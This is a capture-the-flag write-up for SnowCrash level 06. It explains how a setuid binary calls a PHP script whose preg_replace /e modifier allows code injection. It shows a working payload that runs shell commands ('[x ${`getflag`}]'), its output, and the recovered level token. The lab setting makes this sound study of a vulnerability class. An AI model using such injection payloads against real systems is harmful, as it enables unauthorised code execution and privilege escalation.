
****************************************
*               Level 06               *
****************************************

Description :

Let's see what's in here :

level06@SnowCrash:~$ ls
level06  level06.php

Interesting... let's examine what are these :

First, the php script :

level06@SnowCrash:~$ cat level06.php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>

Let's make it more readable :

function y($m)
{
	$m = preg_replace("/\./", " x ", $m);
	$m = preg_replace("/@/", " y", $m);
	return $m;
}

function x($y, $z)
{
	$a = file_get_contents($y);
	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
	$a = preg_replace("/\[/", "(", $a);
	$a = preg_replace("/\]/", ")", $a);
	return $a;
}

$r = x($argv[1], $argv[2]);
print $r;

We can see that in the 3rd execution line, the code uses $argv[1] and $argv[2], so this script takes 2 program arguments... and then passes them as arguments to call the "x" function...

But if we look inside the "x" function, we can see that it never uses the "$z" parameter, so the $argv[2] is never used (it's ignored), so the script essentially takes only 1 argument.

$a = preg_replace("/\[/", "(", $a);	= Find every "[" char and replace it with "("
$a = preg_replace("/\]/", ")", $a);	= Find every "]" char and replace it with ")"

The "\" before the '[' and ']' is just for escaping (because '[' has special meaning in regex, so the '\' says "treat it as a literal character").

The "y" function also takes one string as argument and :

$m = preg_replace("/\./", " x ", $m);	= Find every '.' and replace it with " x "
$m = preg_replace("/@/", " y", $m);	= Find every '@' and replace it with " y"

So the actual pattern is :

(\[x (.*)\])

"\[" 	→ literal [ (escaped because [ has special meaning in regex)
"x"     → literal x  (just the letter x and a space)
"(.*)"  → capture anything (the inner group, group 2)
"\]"    → literal ]

So this script takes a file path as its program argument, reads it inside the "x" function while reading it does some basic character substitution in the file using regex php functions, it specifically searches to find text patterns exactly like this :

[x something]

and then inside those instances, it replaces the '.' with " x " and the '@' with " y".

We also have a binary named "level06" and if we try to execute the binary (not the script) we get :

level06@SnowCrash:~$ ./level06
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4

This means that when you run "./level06", it internally calls the php script level06.php automatically = meaning that this binary too needs to take 1 program argument when you run it (to pass it to the php script) !

Let's try to use it by creating a simple "test" file :

level06@SnowCrash:~$ echo 'my test' > /test
bash: /test: Permission denied

So we don't have the permissions to create files here, let's try on "/tmp" :

level06@SnowCrash:~$ echo 'my test' > /tmp/test
level06@SnowCrash:~$ ./level06 /tmp/test
my test

Ok, so it works. Let's try to substitute text (by including the regex pattern) :

level06@SnowCrash:~$ echo '[x my.test@@@]' > /tmp/test
level06@SnowCrash:~$ ./level06 /tmp/test
my x test y y y

Ok, it worked. If we look further into the php code we find this line :

$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);

Now this is interesting because in PHP the "/e" modifier of preg_replace() is dangerous : instead of just replacing the pattern "[x something]" with a plain string, it executes the replacement as PHP code.

So, the "/e" flag doesn't just call y(). It executes WHATEVER STRING gets built in group 2 (.*) as PHP code.

So if you put inside your file something like [x ${`whoami`}] (instead of just "[x my.test@@@]") :

The group 2 captures "[x ${`whoami`}]", and "/e" builds this :

y("${`whoami`}")

and therefore executes the shell command "whoami", let's try :

level06@SnowCrash:~$ echo '[x ${`whoami`}]' > /tmp/test
level06@SnowCrash:~$ ./level06 /tmp/test
PHP Notice:  Undefined variable: flag06
 in /home/user/level06/level06.php(4) : regexp code on line 1

It worked, we got the "flag06" which is the owner of the binary file. Now this is interesting because it's not us who run the command "whoami", but the script itself, let's see its permissions :

level06@SnowCrash:~$ ls -la
total 24
dr-xr-x---+ 1 level06 level06  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level06 level06  220 Apr  3  2012 .bash_logout
-r-x------  1 level06 level06 3518 Aug 30  2015 .bashrc
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
-r-x------  1 level06 level06  675 Apr  3  2012 .profile

This 's' means that the binary that runs the script is always run in "owner mode" (which here its the user "flag06"), so even if we run the binary, it will actually run as if we were the user "flag06" anyway.

So, we can exploit this by trying to execute commands like "getflag" (as flag06) instead of "whoami" using this binary, let's :

- create a payload file containing the string "[x ${`getflag`} ]" to trigger the regex pattern o fhte php script :

level06@SnowCrash:~$ echo '[x ${`getflag`} ]' > /tmp/ok

- Run the binary ./level06 with that file we just created as its program argument :

level06@SnowCrash:~$ ./level06 /tmp/ok
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1

So, the binary calls the PHP script with elevated "owner" privileges and it runs the "getflag" command and prints the result (our flag) on the screen, so let's use it :

level06@SnowCrash:~$ su level07
Password: wiok45aaoguiboiki2tuin6ub

level07@SnowCrash:~$ 
